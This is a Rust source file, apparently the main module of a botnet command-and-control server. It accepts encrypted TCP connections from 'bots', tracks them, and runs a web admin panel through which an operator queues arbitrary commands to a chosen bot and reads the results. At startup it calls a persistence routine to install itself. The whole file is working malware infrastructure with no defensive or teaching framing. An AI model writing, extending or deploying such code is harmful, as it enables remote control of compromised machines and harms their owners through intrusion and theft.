mod commands;
mod config;
mod encryption;
mod error;
mod persistence;

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Instant;

use axum::{
    extract::State,
    http::StatusCode,
    response::Html,
    routing::{get, post},
    Json, Router,
};
use commands::{Command, CommandResult};
use config::Config;
use error::C2Error;
use serde::{Deserialize, Serialize};
use tokio::net::TcpListener;
use tokio::sync::{mpsc, RwLock};

// --- Shared state ---

pub struct AppState {
    bots: RwLock<HashMap<SocketAddr, BotHandle>>,
    results: RwLock<Vec<ResultEntry>>,
    config: Config,
}

struct BotHandle {
    addr: SocketAddr,
    connected_at: Instant,
    command_tx: mpsc::Sender<Command>,
}

struct ResultEntry {
    bot_addr: SocketAddr,
    command: String,
    result: String,
    timestamp: Instant,
}

// --- API types ---

#[derive(Serialize)]
struct BotInfo {
    addr: String,
    connected_secs: u64,
}

#[derive(Serialize)]
struct ResultInfo {
    bot_addr: String,
    command: String,
    result: String,
    seconds_ago: u64,
}

#[derive(Deserialize)]
struct CommandRequest {
    target: String,
    command: String,
    args: Vec<String>,
}

// --- Admin panel handlers ---

async fn admin_page() -> Html<&'static str> {
    Html(include_str!("admin.html"))
}

async fn list_bots(State(state): State<Arc<AppState>>) -> Json<Vec<BotInfo>> {
    let bots = state.bots.read().await;
    let infos: Vec<BotInfo> = bots.values().map(|b| BotInfo {
        addr: b.addr.to_string(),
        connected_secs: b.connected_at.elapsed().as_secs(),
    }).collect();
    Json(infos)
}

async fn send_command_handler(
    State(state): State<Arc<AppState>>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<String>, StatusCode> {
    let addr: SocketAddr = req.target.parse().map_err(|_| StatusCode::BAD_REQUEST)?;
    let bots = state.bots.read().await;
    if let Some(bot) = bots.get(&addr) {
        let cmd = Command {
            id: 0,
            command: req.command,
            args: req.args,
        };
        bot.command_tx.send(cmd).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        Ok(Json("Command queued".to_string()))
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

async fn get_results(State(state): State<Arc<AppState>>) -> Json<Vec<ResultInfo>> {
    let results = state.results.read().await;
    let infos: Vec<ResultInfo> = results.iter().map(|r| ResultInfo {
        bot_addr: r.bot_addr.to_string(),
        command: r.command.clone(),
        result: r.result.clone(),
        seconds_ago: r.timestamp.elapsed().as_secs(),
    }).collect();
    Json(infos)
}

// --- Bot connection handler ---

async fn handle_bot(
    mut socket: tokio::net::TcpStream,
    addr: SocketAddr,
    state: Arc<AppState>,
) {
    let (tx, mut rx) = mpsc::channel::<Command>(32);

    state.bots.write().await.insert(addr, BotHandle {
        addr,
        connected_at: Instant::now(),
        command_tx: tx,
    });

    eprintln!("[+] Bot connected: {}", addr);

    let key = state.config.settings.encryption_key.as_bytes();

    loop {
        match rx.recv().await {
            Some(cmd) => {
                let json = match serde_json::to_vec(&cmd) {
                    Ok(j) => j,
                    Err(_) => continue,
                };

                if encryption::send_encrypted(&mut socket, &json, key).await.is_err() {
                    break;
                }

                match encryption::recv_encrypted(&mut socket, key).await {
                    Ok(data) => {
                        if let Ok(result) = serde_json::from_slice::<CommandResult>(&data) {
                            state.results.write().await.push(ResultEntry {
                                bot_addr: addr,
                                command: cmd.command,
                                result: result.result,
                                timestamp: Instant::now(),
                            });
                        }
                    }
                    Err(_) => break,
                }
            }
            None => break,
        }
    }

    state.bots.write().await.remove(&addr);
    eprintln!("[-] Bot disconnected: {}", addr);
}

// --- Entry point ---

#[tokio::main]
async fn main() -> Result<(), C2Error> {
    let config = Config::load();

    persistence::add_persistence();

    let tcp_addr = config.settings.tcp_address.clone();
    let admin_addr = config.settings.admin_address.clone();

    let state = Arc::new(AppState {
        bots: RwLock::new(HashMap::new()),
        results: RwLock::new(Vec::new()),
        config,
    });

    // Spawn admin panel HTTP server
    let admin_state = state.clone();
    tokio::spawn(async move {
        let app = Router::new()
            .route("/", get(admin_page))
            .route("/api/bots", get(list_bots))
            .route("/api/command", post(send_command_handler))
            .route("/api/results", get(get_results))
            .with_state(admin_state);

        let listener = TcpListener::bind(&admin_addr).await.unwrap();
        eprintln!("[*] Admin panel: http://{}", admin_addr);
        axum::serve(listener, app).await.unwrap();
    });

    // Start TCP listener for bot connections
    let listener = TcpListener::bind(&tcp_addr)
        .await
        .map_err(|e| C2Error::NetworkError(e.to_string()))?;
    eprintln!("[*] Listening for bots on {}", tcp_addr);

    loop {
        let (socket, addr) = listener
            .accept()
            .await
            .map_err(|e| C2Error::NetworkError(e.to_string()))?;
        let bot_state = state.clone();
        tokio::spawn(async move {
            handle_bot(socket, addr, bot_state).await;
        });
    }
}
